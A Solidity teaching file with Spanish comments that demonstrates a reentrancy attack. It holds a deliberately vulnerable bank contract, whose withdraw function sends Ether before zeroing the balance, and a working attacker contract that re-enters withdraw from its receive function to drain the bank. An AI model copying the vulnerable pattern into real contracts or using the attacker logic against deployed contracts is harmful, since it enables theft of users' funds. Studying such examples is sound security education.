// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
//Reentrancy Attack: el 2do contrato tiene el poder de seguimiento de la lógica del 1ero
contract SimpleBank {
  // "arreglo" de Direcciones => Depósitos
  mapping(address => uint256) public userBalance;

  function deposit() public payable { //para meter Ether al contrato, este debe ser payable
    require(msg.value >= 1 ether, "Minimun Deposit is 1 ETH"); //valido
    userBalance[msg.sender] += msg.value; //actualizo el balance en el mapping
  }
  //Contrato vulnerale, esta función no respeta el CEI pattern
  //1._ Check   2._ Effects    3._ Interactions
  function withdraw() public {
    require(userBalance[msg.sender] >=1 ether, "User has not enough balance");
    require(address(this).balance >0, "Bank is rekt");
    //Aquí manda el ether al contrato "Attacker", de aquí saltamos automáticamente a la función "receive" del contrato "Attacker"
    (bool success, ) = msg.sender.call{value: userBalance[msg.sender]}("");
    require(success, "Fail");

    userBalance[msg.sender] = 0;
  }

  function totalBalance() public view returns(uint){
    return address(this).balance;
  }
  
}

contract Attacker {
  SimpleBank simpleBank; //se instancia el objeto simpleBank

  //Aquí se setea la address
  constructor(address _simpleBankAddress) {
      simpleBank = SimpleBank(_simpleBankAddress);
  }

  function attack() external payable {
    simpleBank.deposit{value: msg.value}();
    simpleBank.withdraw();
  }

  //La función "receive" se invoca automáticamente cuando se envíe ether a este contrato
  receive() external payable {
    if(address(simpleBank).balance >= 1 ether) { //si el banco tiene al menos 1 ether, entonces que vuelva a llamar a withdraw
      simpleBank.withdraw();
    }
  }
}
